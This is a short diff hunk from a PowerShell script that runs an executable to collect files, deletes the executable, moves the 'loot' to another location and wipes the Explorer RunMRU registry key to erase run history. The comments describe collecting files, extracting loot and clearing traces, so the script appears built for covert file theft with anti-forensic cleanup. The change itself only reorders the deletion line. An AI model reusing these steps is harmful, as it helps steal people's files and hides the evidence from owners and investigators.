@@ -23,8 +23,8 @@ Start-Sleep 1
 #The start-sleep is requiered so the *.exe has time to run and collect the files
 Start-process -FilePath $order66 -WorkingDirectory $destination
 start-sleep 6
-Remove-Item $order66 -force -Confirm:$false
 #Extract loot with move-item to clear trace in my documents
+Remove-Item $order66 -force -Confirm:$false
 move-item -Path $destination -Destination $loot[0] -force
 #Delete "run" history
 Remove-item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force
